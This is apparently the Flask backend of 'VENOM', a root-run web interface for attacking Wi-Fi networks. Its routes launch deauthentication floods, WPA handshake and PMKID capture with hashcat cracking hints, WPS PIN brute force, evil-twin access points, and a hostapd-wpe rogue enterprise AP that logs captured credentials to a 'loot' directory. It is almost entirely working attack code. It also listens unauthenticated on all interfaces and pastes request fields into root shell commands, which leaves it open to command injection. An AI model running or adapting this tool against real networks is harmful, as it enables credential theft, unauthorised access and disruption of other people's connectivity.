#!/usr/bin/env python3
"""
VENOM Web UI - Flask backend
Must be run as root (same requirement as venom.sh).
"""

import subprocess
import threading
import queue
import json
import os
import re
import time
from flask import Flask, render_template, request, Response, jsonify, stream_with_context

app = Flask(__name__)

ANSI_ESCAPE = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

state = {
    "wifi_iface": "",
    "monitor_iface": "",
    "target_ssid": "",
    "target_bssid": "",
    "target_channel": "",
    "loot_dir": "./venom_loot",
}

active_proc = None
output_queue = queue.Queue()
proc_lock = threading.Lock()


def strip_ansi(text):
    return ANSI_ESCAPE.sub("", text)


def run_script(script_body):
    """Write script to a temp file and execute it - avoids all bash -c quoting issues."""
    script_path = f"/tmp/venom/run_{int(time.time())}.sh"
    os.makedirs("/tmp/venom", exist_ok=True)
    with open(script_path, "w") as f:
        f.write("#!/bin/bash\n")
        f.write(script_body)
    os.chmod(script_path, 0o700)
    run_command(f"bash {script_path}")


def run_command(cmd):
    """Run a shell command, stream output to output_queue."""
    global active_proc
    with proc_lock:
        if active_proc and active_proc.poll() is None:
            output_queue.put("[!] Another process is already running. Stop it first.\n")
            return

    def target():
        global active_proc
        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                bufsize=1,
            )
            with proc_lock:
                active_proc = proc
            for line in proc.stdout:
                output_queue.put(strip_ansi(line))
            proc.wait()
            output_queue.put(f"[*] Process exited with code {proc.returncode}\n")
        except Exception as e:
            output_queue.put(f"[!] Error: {e}\n")
        finally:
            active_proc = None

    t = threading.Thread(target=target, daemon=True)
    t.start()


def get_interfaces():
    try:
        out = subprocess.check_output(
            "iw dev | grep -o 'Interface .*' | cut -d' ' -f2",
            shell=True, text=True, stderr=subprocess.DEVNULL
        )
        return [i.strip() for i in out.strip().splitlines() if i.strip()]
    except Exception:
        return []


def scan_networks(iface):
    try:
        subprocess.run(f"ip link set dev {iface} up", shell=True, check=False)
        out = subprocess.check_output(
            f"iw dev {iface} scan 2>/dev/null", shell=True, text=True
        )
    except subprocess.CalledProcessError:
        return []

    networks = []
    current = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("BSS "):
            if current.get("bssid"):
                networks.append(current)
            current = {
                "bssid": line.split()[1].split("(")[0],
                "ssid": "", "channel": "", "signal": "", "vendor": "",
            }
        elif line.startswith("SSID:"):
            current["ssid"] = line[5:].strip()
        elif "DS Parameter set: channel" in line:
            current["channel"] = line.split()[-1]
        elif line.startswith("signal:"):
            current["signal"] = line.split()[1] + " dBm"
    if current.get("bssid"):
        networks.append(current)

    oui_db = next(
        (p for p in ["/usr/share/ieee-data/oui.txt", "/var/lib/ieee-data/oui.txt"]
         if os.path.exists(p)), None
    )
    if oui_db:
        for net in networks:
            oui = net["bssid"].replace(":", "").upper()[:6]
            try:
                net["vendor"] = subprocess.check_output(
                    f"grep -i '^{oui}' {oui_db} | awk '{{print $3}}' | head -1",
                    shell=True, text=True
                ).strip() or "Unknown"
            except Exception:
                net["vendor"] = "Unknown"
    return networks


def safe_loot_path(filename):
    """Resolve loot path and ensure it stays inside loot_dir. Returns None on traversal attempt."""
    loot = os.path.realpath(state["loot_dir"])
    path = os.path.realpath(os.path.join(loot, filename))
    if not path.startswith(loot + os.sep) and path != loot:
        return None
    return path


# ============================================================
# ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template("index.html", interfaces=get_interfaces(), state=state)


@app.route("/api/state")
def api_state():
    return jsonify(state)


@app.route("/api/interfaces")
def api_interfaces():
    return jsonify(get_interfaces())


@app.route("/api/scan", methods=["POST"])
def api_scan():
    iface = request.json.get("iface") or state["wifi_iface"]
    if not iface:
        return jsonify({"error": "No interface selected"}), 400
    return jsonify(scan_networks(iface))


@app.route("/api/set_target", methods=["POST"])
def api_set_target():
    data = request.json
    state["target_bssid"] = data.get("bssid", "")
    state["target_ssid"] = data.get("ssid", "")
    state["target_channel"] = data.get("channel", "")
    return jsonify({"ok": True, "state": state})


@app.route("/api/set_iface", methods=["POST"])
def api_set_iface():
    state["wifi_iface"] = request.json.get("iface", "")
    return jsonify({"ok": True, "state": state})


@app.route("/api/monitor/enable", methods=["POST"])
def api_monitor_enable():
    iface = state["wifi_iface"]
    if not iface:
        return jsonify({"error": "No interface selected"}), 400
    run_command(f"airmon-ng check kill >/dev/null 2>&1; airmon-ng start {iface} 2>&1")
    # Detect which monitor interface was created
    time.sleep(2)
    mon = f"{iface}mon"
    try:
        subprocess.check_call(f"iw dev {mon} info >/dev/null 2>&1", shell=True)
        state["monitor_iface"] = mon
    except subprocess.CalledProcessError:
        # airmon-ng may have kept the same name
        try:
            result = subprocess.check_output(
                f"iw dev {iface} info 2>/dev/null | grep 'type monitor'",
                shell=True, text=True
            )
            if result.strip():
                state["monitor_iface"] = iface
        except subprocess.CalledProcessError:
            state["monitor_iface"] = ""
    return jsonify({"ok": True, "state": state})


@app.route("/api/monitor/disable", methods=["POST"])
def api_monitor_disable():
    mon = state.get("monitor_iface")
    if not mon:
        # Try the conventional name as fallback
        iface = state.get("wifi_iface", "")
        mon = f"{iface}mon" if iface else ""
    if not mon:
        state["monitor_iface"] = ""
        return jsonify({"ok": True, "state": state})
    run_command(f"airmon-ng stop {mon} 2>&1; systemctl restart NetworkManager 2>/dev/null")
    state["monitor_iface"] = ""
    return jsonify({"ok": True, "state": state})


@app.route("/api/attack/deauth", methods=["POST"])
def api_deauth():
    d = request.json
    bssid   = d.get("bssid") or state["target_bssid"]
    channel = d.get("channel") or state["target_channel"]
    packets = d.get("packets", 64)
    client  = d.get("client", "").strip()
    mon     = state.get("monitor_iface")
    if not mon:
        return jsonify({"error": "Monitor mode not active"}), 400
    if not bssid:
        return jsonify({"error": "No target selected"}), 400
    client_arg = f"-c {client}" if client else ""
    channel_cmd = f"iw dev {mon} set channel {channel} 2>/dev/null\n" if channel else ""
    run_script(f"""
{channel_cmd}aireplay-ng --deauth {packets} -a {bssid} {client_arg} {mon}
""")
    return jsonify({"ok": True})


@app.route("/api/attack/handshake", methods=["POST"])
def api_handshake():
    bssid   = state["target_bssid"]
    channel = state["target_channel"]
    ssid    = re.sub(r"[^a-zA-Z0-9_]", "_", state["target_ssid"])
    mon     = state.get("monitor_iface")
    loot    = state["loot_dir"]
    if not mon or not bssid:
        return jsonify({"error": "Monitor mode and target required"}), 400
    os.makedirs(loot, exist_ok=True)
    cap = f"{loot}/hs_{ssid}_{int(time.time())}"
    run_script(f"""
airodump-ng --bssid {bssid} --channel {channel} --write {cap} {mon} &
DUMP_PID=$!
sleep 5
aireplay-ng --deauth 15 -a {bssid} {mon} >/dev/null 2>&1
sleep 20
kill $DUMP_PID 2>/dev/null
wait $DUMP_PID 2>/dev/null
if aircrack-ng {cap}-01.cap 2>/dev/null | grep -qi "WPA handshake"; then
    echo "[+] Handshake captured: {cap}-01.cap"
    echo "[*] Crack with: aircrack-ng -w <wordlist> {cap}-01.cap"
else
    echo "[-] No handshake captured yet. File: {cap}-01.cap"
fi
""")
    return jsonify({"ok": True})


@app.route("/api/attack/pmkid", methods=["POST"])
def api_pmkid():
    bssid = state["target_bssid"]
    ssid  = re.sub(r"[^a-zA-Z0-9_]", "_", state["target_ssid"])
    mon   = state.get("monitor_iface")
    loot  = state["loot_dir"]
    if not mon or not bssid:
        return jsonify({"error": "Monitor mode and target required"}), 400
    os.makedirs(loot, exist_ok=True)
    pcap     = f"{loot}/pmkid_{ssid}_{int(time.time())}.pcapng"
    hashfile = pcap.replace(".pcapng", ".hash")
    oui      = bssid.replace(":", "")
    run_script(f"""
echo '{oui}' > /tmp/venom_filter.txt
timeout 60 hcxdumptool -i {mon} --filterlist_ap=/tmp/venom_filter.txt --filtermode=2 -o {pcap} 2>&1
if [ -f "{pcap}" ]; then
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o {hashfile} {pcap} 2>&1
        echo "[+] Hash file: {hashfile}"
        echo "[*] Crack with: hashcat -m 22000 {hashfile} <wordlist>"
    elif command -v hcxpcaptool >/dev/null 2>&1; then
        hcxpcaptool -z {hashfile} {pcap} 2>&1
        echo "[+] Hash file: {hashfile}"
        echo "[*] Crack with: hashcat -m 16800 {hashfile} <wordlist>"
    else
        echo "[-] hcxpcapngtool not found. Raw capture: {pcap}"
    fi
else
    echo "[-] No PMKID captured."
fi
""")
    return jsonify({"ok": True})


@app.route("/api/attack/evil_twin", methods=["POST"])
def api_evil_twin():
    bssid   = state["target_bssid"]
    ssid    = state["target_ssid"]
    channel = state["target_channel"] or "6"
    iface   = state["wifi_iface"]
    mon     = state.get("monitor_iface")
    if not iface or not ssid:
        return jsonify({"error": "Interface and target required"}), 400
    os.makedirs("/tmp/venom", exist_ok=True)
    conf = "/tmp/venom/evil_twin.conf"
    with open(conf, "w") as f:
        f.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
                f"channel={channel}\nhw_mode=g\nignore_broadcast_ssid=0\n")
    deauth_block = ""
    if mon and bssid:
        deauth_block = f"aireplay-ng --deauth 0 -a {bssid} {mon} >/dev/null 2>&1 &\nDPID=$!\n"
    run_script(f"""
{deauth_block}hostapd {conf}
[ -n "$DPID" ] && kill $DPID 2>/dev/null
""")
    return jsonify({"ok": True})


@app.route("/api/attack/wps", methods=["POST"])
def api_wps():
    bssid   = state["target_bssid"]
    channel = state["target_channel"]
    mon     = state.get("monitor_iface")
    loot    = state["loot_dir"]
    if not mon or not bssid:
        return jsonify({"error": "Monitor mode and target required"}), 400
    if not channel:
        return jsonify({"error": "No channel set - select a target first"}), 400
    os.makedirs(loot, exist_ok=True)
    logfile = f"{loot}/wps_{int(time.time())}.log"
    if os.path.exists("/usr/bin/reaver") or os.path.exists("/usr/sbin/reaver"):
        cmd = f"reaver -i {mon} -b {bssid} -c {channel} -vv -K 1 2>&1 | tee {logfile}"
    elif os.path.exists("/usr/bin/bully"):
        cmd = f"bully {mon} -b {bssid} -c {channel} -v 3 2>&1 | tee {logfile}"
    else:
        return jsonify({"error": "Neither reaver nor bully found. Install: apt install reaver"}), 400
    run_command(cmd)
    return jsonify({"ok": True})


@app.route("/api/attack/venom", methods=["POST"])
def api_venom():
    bssid   = state["target_bssid"]
    ssid    = state["target_ssid"]
    channel = state["target_channel"] or "6"
    iface   = state["wifi_iface"]
    mon     = state.get("monitor_iface")
    loot    = state["loot_dir"]
    if not iface or not ssid:
        return jsonify({"error": "Interface and target required"}), 400

    os.makedirs("/tmp/venom/certs", exist_ok=True)
    os.makedirs(loot, exist_ok=True)
    cred_log = f"{loot}/venom_creds_{int(time.time())}.log"
    conf     = "/tmp/venom/venom_wpe.conf"

    if not os.path.exists("/tmp/venom/certs/server.pem"):
        output_queue.put("[*] Generating self-signed certificate...\n")
        subprocess.run(
            "openssl req -new -x509 -days 365 -nodes "
            "-out /tmp/venom/certs/server.pem "
            "-keyout /tmp/venom/certs/server.key "
            '-subj "/C=US/ST=State/L=City/O=Corp/CN=radius.local" 2>/dev/null && '
            "openssl dhparam -out /tmp/venom/certs/dh 1024 2>/dev/null && "
            "cp /tmp/venom/certs/server.pem /tmp/venom/certs/ca.pem",
            shell=True
        )

    with open("/tmp/venom/eap_users", "w") as f:
        f.write('*\t\tPEAP,TTLS,TLS,MD5\n"t"\t\tTTLS-MSCHAPV2,TTLS-MSCHAP,TTLS-PAP,TTLS-CHAP,TTLS,MD5\t"t" [2]\n')

    hostapd_bin = "hostapd-wpe" if os.path.exists("/usr/sbin/hostapd-wpe") else "hostapd"
    cfg = (
        f"interface={iface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\n"
        "hw_mode=g\nieee8021x=1\neapol_version=2\neap_server=1\n"
        "eap_user_file=/tmp/venom/eap_users\n"
        "ca_cert=/tmp/venom/certs/ca.pem\n"
        "server_cert=/tmp/venom/certs/server.pem\n"
        "private_key=/tmp/venom/certs/server.key\n"
        "dh_file=/tmp/venom/certs/dh\n"
        "auth_algs=3\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\n"
        "ignore_broadcast_ssid=0\n"
    )
    if hostapd_bin == "hostapd-wpe":
        cfg += f"wpe_logfile={cred_log}\n"
    with open(conf, "w") as f:
        f.write(cfg)

    deauth_block = ""
    if mon and bssid:
        deauth_block = f"aireplay-ng --deauth 0 -a {bssid} {mon} >/dev/null 2>&1 &\nDPID=$!\n"

    run_script(f"""
{deauth_block}touch {cred_log}
tail -f {cred_log} &
TAILPID=$!
{hostapd_bin} {conf}
kill $TAILPID 2>/dev/null
[ -n "$DPID" ] && kill $DPID 2>/dev/null
echo "[+] Cred log: {cred_log}"
""")
    return jsonify({"ok": True})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    global active_proc
    with proc_lock:
        if active_proc and active_proc.poll() is None:
            active_proc.terminate()
            return jsonify({"ok": True, "msg": "Process terminated"})
    return jsonify({"ok": True, "msg": "No active process"})


@app.route("/api/loot")
def api_loot():
    loot = state["loot_dir"]
    if not os.path.exists(loot):
        return jsonify([])
    files = []
    for fname in sorted(os.listdir(loot), reverse=True):
        path = os.path.join(loot, fname)
        if os.path.isfile(path):
            files.append({
                "name": fname,
                "size": os.path.getsize(path),
                "modified": int(os.path.getmtime(path)),
            })
    return jsonify(files)


@app.route("/api/loot/<path:filename>")
def api_loot_file(filename):
    path = safe_loot_path(filename)
    if path is None:
        return jsonify({"error": "Invalid path"}), 400
    if not os.path.exists(path) or not os.path.isfile(path):
        return jsonify({"error": "Not found"}), 404
    with open(path, "r", errors="replace") as f:
        return jsonify({"content": f.read()})


@app.route("/stream")
def stream():
    def generate():
        while True:
            try:
                line = output_queue.get(timeout=30)
                yield f"data: {json.dumps(line)}\n\n"
            except queue.Empty:
                yield "data: \n\n"  # keepalive
    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Run as root")
        exit(1)
    os.makedirs("/tmp/venom", exist_ok=True)
    print("[*] VENOM Web UI starting on http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
